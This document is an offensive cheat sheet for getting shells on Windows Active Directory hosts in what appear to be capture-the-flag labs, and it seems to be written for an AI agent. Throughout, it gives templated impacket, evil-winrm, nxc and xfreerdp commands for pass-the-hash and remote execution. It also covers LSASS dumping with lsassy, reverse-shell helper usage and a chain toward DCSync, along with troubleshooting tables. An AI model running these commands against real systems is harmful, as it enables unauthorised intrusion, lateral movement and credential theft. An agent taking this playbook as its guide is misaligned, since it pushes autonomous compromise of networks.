# Shells (senior)

You need a shell only for LSASS / SAM / local files. ACL / ADCS / DCSync do not.

## Pick

| Situation | Tool |
| --- | --- |
| WinRM 5985 open, user in Remote Management | `evil-winrm` |
| Local admin, RPC alive | `wmiexec` (quiet-ish) |
| Admin$ blocked, SMB open | `smbexec` |
| You want a service binary | `psexec` (noisy) |
| 3389 + not Protected Users | `xfreerdp` |
| MSSQL sysadmin | `mssqlclient` + `xp_cmdshell` |
| You have a TGT | any of the above with `-k` / `--use-kcache` |

```
evil-winrm -i HOST -u {{USER}} -p '{{PASS}}'
evil-winrm -i HOST -u {{USER}} -H {{HASH}}

impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@HOST
impacket-smbexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@HOST
impacket-psexec  {{DOMAIN}}/{{USER}}:'{{PASS}}'@HOST
impacket-wmiexec -k -no-pass {{DOMAIN}}/{{USER}}@HOST

xfreerdp /v:HOST /u:{{USER}} /p:'{{PASS}}' /d:{{DOMAIN}} /cert:ignore

nxc winrm {{CIDR}} -u {{USER}} -p '{{PASS}}'
nxc rdp   {{CIDR}} -u {{USER}} -p '{{PASS}}'
```

## Read this

- `Pwn3d!` on nxc smb ≠ WinRM. Check `nxc winrm` separately.
- **No 5985 in recon → WinRM is closed. Do not reach for evil-winrm.** With an
  Administrator hash, grab the file over SMB instead:
  `impacket-smbclient.py -hashes :{{HASH}} {{DOMAIN}}/Administrator@{{DC}}` (`use C$`),
  or `impacket-atexec -hashes :{{HASH}} {{DOMAIN}}/Administrator@{{DC}} 'type C:\Users\Administrator\Desktop\flag.txt'`.
- evil-winrm `WinRM::WinRMAuthorizationError` → not in the right group, or NTLM disabled (use a TGT).
- xfreerdp NLA fail + Protected Users → Kerberos only, or skip RDP.
- psexec `causes the service to stop` → AV ate `PSEXESVC`. wmiexec.

Once on the box: `onhost.md`. From Kali, prefer `nxc -M lsassy` before you RDP.

**Just need the flag / a file? Don't loop one-off `atexec` calls (token waste).**
`revshell.md`: `revshell.sh flags {{DC}} -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}}`
is one WinRM sweep of every flag location. Want interactive? `revshell.sh
payload/listen` — but catch it in a tty, never over MCP.

## Fail → next

| Symptom | Next |
| --- | --- |
| no local admin anywhere | stay in LDAP (ACL / ADCS / delegation) |
| Protected Users | getTGT, never PTH |
| WinRM filtered / 5985 closed | `smbclient.py` (C$) or `atexec` with the hash — not evil-winrm |
| atexec `&`-chained command returns empty | one command per `atexec` call; the quoting drops chained `&`/`&&` |
| GUI exe launched over WinRM exits in <6 s | session-0 has no desktop. Do not `Start-Process` / `start /b`. Pattern: `nohup` on Kali wrapping synchronous `nxc winrm … -x 'cmd /c "cd /d C:\Ad && agent.exe"'`. `exit 124` ⇒ probably alive — `tasklist` from a fresh session before retrying |
| WinRM "Executed command" but no listing/hash | `tail -N` swallowed the output. Rerun with `grep -a`; never truncate a first attempt |
| `impacket-smbclient: unrecognized arguments: -windows-auth` | flag removed in impacket 0.14. NTLM is the default — drop it |
| RDP allowed, exec not | you are a desktop user. dump files, not LSASS |
| mssqlclient but not sysadmin | impersonate / links (`impacket.md`) |

## Chain

Pwn3d → lsassy → new DA session? DCSync. Else on-host SAM / browser / unattend.
Do not drop third-party C2. Public tools only.
